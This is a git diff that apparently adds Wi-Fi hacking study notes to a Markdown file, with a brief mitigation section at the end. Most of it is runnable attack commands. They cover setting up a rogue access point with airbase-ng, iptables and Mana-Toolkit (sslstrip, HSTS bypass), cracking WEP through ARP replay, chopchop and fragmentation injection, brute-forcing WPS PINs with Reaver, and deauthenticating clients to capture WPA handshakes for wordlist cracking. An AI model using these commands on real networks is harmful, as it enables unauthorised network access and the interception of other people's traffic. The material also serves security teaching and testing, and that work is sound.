@@ -154,6 +154,224 @@ Two cards required
 - One network card needs to be connected to the internet
 - Another card needs to broadcast as an access point (wi-fi card)
 
+How it works
+
+```
+Client web request -> wi-fi card 2 (AP) -> wi-fi card 1 -> Internet
+Internet web response -> wi-fi card 1 -> wi-fi card 2 (AP) -> Client
+```
+
+### Executing
+
+#### Using airbase
+
+```
+$ apt-get install dnsmasq
+// Server used to connect to the network
+$ echo -e "interface=at0\ndhcp-range=192.168.0.50,192.168.0.150,12h" > /etc/dnsmasq.conf
+// Modify config, set interface name & IP range, these are fake
+$ airbase-ng -e [network name] -c [channel] [interface]
+// creating the fake access point
+$ ifconfig at0 192.168.0.1 up
+// Bringing the fake AP up
+$ iptables --flush
+$ iptables --table nat --flush
+$ iptables --delete-chain
+$ iptables --table nat --delete-chain
+// Removing the iptable rules
+$ iptables -P FORWARD ACCEPT
+// Enable packet forward in iptables
+$ iptables -t nat -A POSTROUTING -o [internet interface] -j MASQUERADE
+// Link the wifi card and the card thats connected to the internet
+$ dnsmasq
+// start the server
+$ echo "1" > /proc/sys/net/ipv4/ip_forward
+// enable IP forwarding
+```
+
+#### Using Mana-Toolkit
+
+Simplifies process. Creates new AP with sslstrip/firelamp & attempts to bypass HSTS.
+```
+$ start_noupstream	// AP, no internet
+$ start-nat-simple	// AP, internet in upstream interface
+$ start-nat-full	// AP w/ internet + sslstrip, sslsplit, firelamp, & HSTS bypass
+$ apt-get install mana-toolkit
+$ gedit /etc/mana-toolkit/hostapd-mana.conf
+$ gedit /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
+$ bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
+```
+
+### Accessing Encrypted Networks
+
+#### WEP Cracking
+
+WEP is an old encryption, but still used.
+
+- RC4 Algorithm, each packet encrypted at AP and decrypted at the client.
+- Each packet has a unique stream with a random 24-bit IV (Initializing Vector)
+- IV is in plain text
+- With 2+ packets with the same IV, we can use statistical attacks to crack
+
+```
+// Log all traffic from the network
+$ airodump-ng -channel 6 -bssid 11:22:33:44:55:66 -write out mon0
+// Crack the WEP key
+$ aircrack-ng out-01.cap
+// Remove the colons from the key and you can use as the WEP key
+```
+
+#### WEP Packet Injection
+
+If there are no clients or the AP is idle, we need to inject packets.
+
+Always needed - Authenticate our wifi card with the AP
+```
+// aireplay-ng --fakeauth 0 -a [target MAC] -h [your MAC] [interface]
+$ aireplay-ng --fakeauth 0 -a E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 mon0
+```
+
+Three Methods
+
+1. ARP request reply
+
+We wait for an ARP packet, then inject it into the traffic. The AP then generates
+a new ARP packet with a new IV. We repeat the process until we have enough IVs.
+```
+$ aireplay-ng --arpreplay -b E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 mon0
+```
+
+2. Korek Chop Chop
+
+- Works with weak signals
+- More complex
+- Three steps
+		- Determine packet key stream
+		- Forge new packet
+		- Inject it into the traffic
+```
+// Get the keystream
+$ aireplay-ng --chopchop -b 00:10:18:90:2D:EE -h 00:c0:ca:6c:ca:12 mon0
+// Forge the packet, IPs are needed, but can be set to 255
+$ packetforge-ng -0 -a E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-0824-110731.xor -w chopchopforgedpacket
+// Inject the packet into the network
+$ aireplay-ng -2 -r chopchopforgedpacket mon0
+```
+
+3. Fragmentation Attack
+
+Obtains 1500 bytes of the PRGA (pseudo random generation algorithm), forges a new packet
+and injects them into the traffic to generate new IVs.
+
+```
+// Obtain PRGA
+$ aireplay-ng --fragment -b E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 mon0
+// Forge a new Packet
+$ packetforge-ng -0 -a E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w fragmentpacket
+// Inject forged packet into the traffic
+$ aireplay-ng -2 -r fragmentpacket mon0
+```
+
+### WPA Cracking
+
+- Designed to fix WEP issues & improve encryption
+- Each packet encrypted with a unique temporary key, so # of packets is irrelevant
+- WPA & WPA2 are similar
+
+#### WPS Feature
+
+- Allows for easy connections using a button press
+- 8 digit long pin for authentication
+- Brute force in < 10 hours
+- Reaver can then recover the WPA key from this pin
+
+```
+// Search for devices with WPS enabled
+$ wash -i mon0
+// Use Reaver to recover WPA key
+$ reaver -b E0:69:95:B8:BF:77 -c 11 -i mon0
+```
+
+#### Capture Handshake
+
+- WPA packet capture is not useful
+- Only packets that contain info are the handshake packets
+- Four-Way handshake every time a client connects to AP
+- We can launch a wordlist attack using aircrack against the handshake
+
+```
+// Capture traffic
+$ airodump-ng -channel 6 -bssid 11:22:33:44:55:66 -write out mon0
+// De-authenticate a client so they have to reconnect
+$ aireplay-ng --deauth 4 -a [AP] -c [target] [interface]
+```
+
+#### Wordlist
+
+Crunch - Create your own wordlist
+
+```
+./crunch [min] [max] [characters=lower|upper|numbers|symbols] -t [pattern] -o file
+./crunch 6 8 123456!"$& -o wordlist -t a@@@@b
+// In this example, starts with a ends with b
+```
+
+#### Cracking the key
+
+```
+$ aircrack-ng [Handshake File] -w [WORDLIST] [Interface]
+$ aircrack-ng is-01.cap -w list mon0
+```
+
+Combine each password in the wordlist with AP name (essid) to compute Pairwise Master Key (PMK)
+using the pbkdf2 algorithm. We can do this to save time if no clients are on the network and we
+have to wait for them.
+
+```
+// Create a new DB with passwords imported
+$ airolib-ng test-db --import passwd wpa-wordlist
+// Put essid into file
+$ echo "test-ap" > test-essid
+// Put essid into database
+$ airolib-ng test-db --import essid test-essid
+// Create PMKs
+$ airolib-ng test-db --batch
+// Crack the password, it will be much faster with this previous work done
+$ aircrack-ng -r test-db test-handshake-01.cap
+```
+
+#### Faster cracking with Hash Cat
+
+Hashcat uses the GPU rather than CPU for cracking
+
+```
+https://hashcat.net/oclhashcat/
+https://hashcat.net/hashcat-gui/
+https://hashcat.net/cap2hccap
+```
+
+## Mitigating Risks & Securing your Network
+
+1. Don't use WEP
+2. Don't enable WPS
+3. Use WPA2 with a complex password
+
+### Accessing your router
+
+Usually your subnet + .1
+```
+192.168.0.1
+// Subnet is first 3 numbers
+```
+
+You can fix the settings to your desire. You can add access controls for MAC addresses.
+
+## Post Connection Attacks
+
+
+
+
+
 
 
 
